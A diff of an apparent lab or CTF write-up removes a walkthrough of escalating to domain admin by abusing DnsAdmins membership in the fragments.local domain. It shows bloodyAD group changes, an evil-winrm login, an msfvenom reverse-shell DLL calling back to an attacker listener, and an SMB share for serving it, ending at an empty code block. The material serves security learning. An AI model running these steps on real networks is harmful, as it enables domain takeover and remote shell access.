@@ -643,8 +643,6 @@ So this means i have GenericAll over a lot of high privileged groups, excluding 
 
 There are several methods to abuse this privilege as seen with the 49 instances of outbound object control in bloodhound
 
-This includes the dnsadmins group, which is what i will abuse in this instance
-
 # Abusing `dnsadmins`
 
 So since i have GenericAll over the group itslelf i first have to add my user to the group!
@@ -663,85 +661,6 @@ Since im using kerberos becuase of the limitations of the protected users ill st
 export KRB5CCNAME=sharedadmin.ccache
 ```
 
-Then ill add the user to the group
-
-```python
-bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'dnsadmins' 'sharedadmin' 
-[+] sharedadmin added to dnsadmins
-```
-
-To exploit `dnsadmins` i also need a way of executing powershell, so ill also add this user to the remote management users group
-
-```python
-bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'remote management users' 'sharedadmin' 
-[+] sharedadmin added to remote management users
-```
-
-Now the groups are set up, i can work on logging into evil-wirm but first ill need to generate a realm since im using kerberos
-
-```python
-sudo nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' -k --smb-timeout 5 --generate-krb5-file /etc/krb5.conf
-[sudo] password for kali: 
-SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         dc01.fragments.local 445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
-SMB         dc01.fragments.local 445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
-SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
-```
-
-```python
-export KRB5_CONFIG=/etc/krb5.conf
-```
-
-Now ive generated it and exported it i can login to evil-winrm
-
-## Domain Admin
-
-```python
-evil-winrm -i dc01.fragments.local -u sharedadmin -r fragments.local                         
-                                        
-Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Warning: User is not needed for Kerberos auth. Ticket will be used
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
-```
-
-Now i have access i can abuse DNS to get DA
-
-```python
-msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.200.76.227 LPORT=1337 -f dll -o reverse.dll
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Final size of dll file: 9216 bytes
-Saved as: reverse.dll
-```
-
-First ill generate a payload!
-
-```python
-penelope -p 1337         
-[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.76.227
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-```
-
-Then set a listener
-
-```python
-sudo impacket-smbserver share $(pwd) -smb2support
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-```
-
-Then set a smb server
-
-```python
-
-```
 
 
 
